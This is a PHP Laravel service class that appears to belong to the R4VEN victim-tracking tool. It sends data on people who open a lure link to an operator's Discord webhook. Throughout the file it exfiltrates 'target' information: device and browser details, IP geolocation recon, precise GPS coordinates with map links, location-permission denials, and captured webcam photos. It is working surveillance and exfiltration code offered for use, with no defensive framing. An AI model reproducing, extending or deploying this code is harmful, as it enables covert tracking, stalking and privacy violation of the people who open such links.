<?php

namespace App\Services;

use App\Models\Setting;
use App\Models\VisitorLog;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;

class DiscordService
{
    protected ?string $webhookUrl;
    protected string $botName;
    protected string $avatarUrl;

    public function __construct()
    {
        $this->webhookUrl = Setting::get('discord_webhook_url') ?: config('services.discord.webhook_url');
        $this->botName = Setting::get('bot_name', 'R4VEN');
        $this->avatarUrl = Setting::get(
            'bot_avatar_url',
            'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png'
        );
    }

    public function getWebhookUrl(): ?string
    {
        return $this->webhookUrl;
    }

    public function isConfigured(): bool
    {
        return !empty($this->webhookUrl) && filter_var($this->webhookUrl, FILTER_VALIDATE_URL) !== false;
    }

    public function sendTestMessage(?string $customUrl = null): array
    {
        $url = $customUrl ?: $this->webhookUrl;
        if (empty($url)) {
            return ['success' => false, 'message' => 'Discord Webhook URL is empty.'];
        }

        try {
            $payload = [
                'username' => $this->botName,
                'avatar_url' => $this->avatarUrl,
                'content' => '🟢 **[R4VEN-Laravel]** Webhook connection verified successfully!',
                'embeds' => [
                    [
                        'title' => 'R4VEN Service Status: Active',
                        'description' => "Server timestamp: " . now()->toDateTimeString() . "\nEnvironment: " . app()->environment() . "\nEverything is configured properly!",
                        'color' => 5763719, // Green
                        'footer' => [
                            'text' => 'R4VEN Laravel Edition'
                        ]
                    ]
                ]
            ];

            $response = Http::timeout(6)->post($url, $payload);

            if ($response->successful()) {
                return ['success' => true, 'message' => 'Test message sent to Discord successfully.'];
            }

            return ['success' => false, 'message' => 'Discord error: ' . $response->status() . ' ' . $response->body()];
        } catch (\Throwable $e) {
            return ['success' => false, 'message' => 'Connection error: ' . $e->getMessage()];
        }
    }

    public function sendSystemInfo(VisitorLog $log): bool
    {
        if (!$this->isConfigured()) return false;

        $sysinfo = "```xl\n" . ($log->user_agent ?? 'Unknown') . "```" .
            "```autohotkey\n" .
            "Platform: " . ($log->platform ?? 'Unknown') . "\n" .
            "Browser_Language: " . ($log->browser_language ?? 'Unknown') . "\n" .
            "Browser_Name: " . ($log->browser_name ?? 'Unknown') . "\n" .
            "Ram: " . ($log->ram ? $log->ram . ' GB' : 'N/A') . "\n" .
            "CPU_cores: " . ($log->cpu_cores ?? 'N/A') . "\n" .
            "Screen: " . ($log->screen_resolution ?? 'N/A') . "\n" .
            "Time: " . now()->toTimeString() . "\n" .
            "RefUrl: " . ($log->referrer ?? 'Direct') . "\n" .
            "Target_IP: " . ($log->ip ?? 'Unknown') . "\n" .
            "Session_UUID: " . $log->uuid .
            "```";

        $payload = [
            'username' => $this->botName,
            'avatar_url' => $this->avatarUrl,
            'content' => "@everyone Someone Opened The Link O_o",
            'embeds' => [
                [
                    'author' => [
                        'name' => "Target System Information.."
                    ],
                    'title' => "Uagent & Device Info:",
                    'description' => $sysinfo,
                    'color' => 15418782, // Pink/Purple
                    'footer' => [
                        'text' => "Target Session: " . $log->uuid
                    ]
                ]
            ]
        ];

        return $this->postPayload($payload);
    }

    public function sendIpRecon(VisitorLog $log, array $geo = []): bool
    {
        if (!$this->isConfigured()) return false;

        $continent = $geo['continent'] ?? $log->continent ?? 'Unknown';
        $country = $geo['country'] ?? $log->country ?? 'Unknown';
        $countryCode = $geo['countryCode'] ?? $log->country_code ?? '';
        $regionName = $geo['regionName'] ?? $log->region_name ?? 'Unknown';
        $city = $geo['city'] ?? $log->city ?? 'Unknown';
        $zip = $geo['zip'] ?? $log->zip ?? 'Unknown';
        $timezone = $geo['timezone'] ?? $log->timezone ?? 'Unknown';
        $isp = $geo['isp'] ?? $log->isp ?? 'Unknown';
        $org = $geo['org'] ?? $log->org ?? 'Unknown';
        $lat = $geo['lat'] ?? $log->ip_lat ?? 0;
        $lon = $geo['lon'] ?? $log->ip_lon ?? 0;
        $as = $geo['as'] ?? 'Unknown';
        $reverse = $geo['reverse'] ?? 'Unknown';

        $description = "```autohotkey\n" .
            "IP: " . $log->ip . "\n" .
            "Continent: " . $continent . "\n" .
            "Country: " . $country . " (" . $countryCode . ")\n" .
            "Region: " . $regionName . "\n" .
            "City: " . $city . "\n" .
            "Zip: " . $zip . "\n" .
            "Timezone: " . $timezone . "\n" .
            "ISP: " . $isp . "\n" .
            "Org: " . $org . "\n" .
            "AS: " . $as . "\n" .
            "Reverse_DNS: " . $reverse . "\n" .
            "Approx_Lat: " . $lat . "\n" .
            "Approx_Lon: " . $lon .
            "```\n" .
            "__**IP Details:**__ https://ip-api.com/#" . $log->ip;

        $payload = [
            'username' => $this->botName,
            'avatar_url' => $this->avatarUrl,
            'embeds' => [
                [
                    'author' => [
                        'name' => "IP Address Reconnaissance"
                    ],
                    'title' => "IP: " . $log->ip . " (" . $city . ", " . $country . ")",
                    'description' => $description,
                    'color' => 5763719, // Green
                    'footer' => [
                        'text' => "Geographic location based on IP address is approximate."
                    ]
                ]
            ]
        ];

        return $this->postPayload($payload);
    }

    public function sendGpsLocation(VisitorLog $log): bool
    {
        if (!$this->isConfigured()) return false;

        $lat = $log->gps_lat;
        $lon = $log->gps_lon;
        $acc = $log->gps_accuracy ? " (Accuracy: {$log->gps_accuracy}m)" : "";

        $latlong = "```prolog\n" .
            "Latitude: " . $lat . "\n" .
            "Longitude: " . $lon . "\n" .
            "Accuracy: " . ($log->gps_accuracy ?? 'N/A') . " meters\n" .
            "Time: " . ($log->gps_captured_at ? $log->gps_captured_at->toDateTimeString() : now()->toDateTimeString()) .
            "```" .
            "\n__**Google Maps Location:**__ https://www.google.com/maps/place/{$lat},{$lon}" .
            "\n__**Google Earth:**__ https://earth.google.com/web/search/{$lat},{$lon}";

        $payload = [
            'username' => $this->botName,
            'avatar_url' => $this->avatarUrl,
            'embeds' => [
                [
                    'author' => [
                        'name' => "Target Allowed Location Permission"
                    ],
                    'title' => "📍 GPS exact location captured! {$acc}",
                    'description' => $latlong,
                    'color' => 15844367, // Gold/Yellow
                    'footer' => [
                        'text' => "GPS coordinates are high-precision satellite/device telemetry."
                    ]
                ]
            ]
        ];

        return $this->postPayload($payload);
    }

    public function sendGpsDenied(VisitorLog $log, ?string $reason = null): bool
    {
        if (!$this->isConfigured()) return false;

        $msg = $reason ?: 'User denied the request for Geolocation.';
        $payload = [
            'username' => $this->botName,
            'avatar_url' => $this->avatarUrl,
            'content' => "```diff\n- Target Geolocation Status: {$msg}\n- IP: {$log->ip} | Session: {$log->uuid}```"
        ];

        return $this->postPayload($payload);
    }

    public function sendSnapshot(VisitorLog $log, string $absoluteFilePath): bool
    {
        if (!$this->isConfigured() || !file_exists($absoluteFilePath)) {
            return false;
        }

        try {
            $filename = basename($absoluteFilePath);
            $embed = [
                'title' => "📸 Target Webcam Photo Captured",
                'description' => "**Target IP:** `{$log->ip}`\n**Country/City:** {$log->city}, {$log->country}\n**Platform:** `{$log->platform}`\n**Captured At:** " . now()->toDateTimeString(),
                'color' => 15548997, // Red
                'image' => [
                    'url' => "attachment://{$filename}"
                ],
                'footer' => [
                    'text' => "Session UUID: {$log->uuid}"
                ]
            ];

            $response = Http::timeout(15)
                ->attach('file', file_get_contents($absoluteFilePath), $filename)
                ->post($this->webhookUrl, [
                    'payload_json' => json_encode([
                        'username' => $this->botName,
                        'avatar_url' => $this->avatarUrl,
                        'content' => "📸 New webcam capture from target `{$log->ip}`!",
                        'embeds' => [$embed]
                    ])
                ]);

            return $response->successful();
        } catch (\Throwable $e) {
            Log::error("DiscordService snapshot dispatch failed: " . $e->getMessage());
            return false;
        }
    }

    protected function postPayload(array $payload): bool
    {
        try {
            $response = Http::timeout(6)->post($this->webhookUrl, $payload);
            return $response->successful();
        } catch (\Throwable $e) {
            Log::error("DiscordService payload dispatch failed: " . $e->getMessage());
            return false;
        }
    }
}
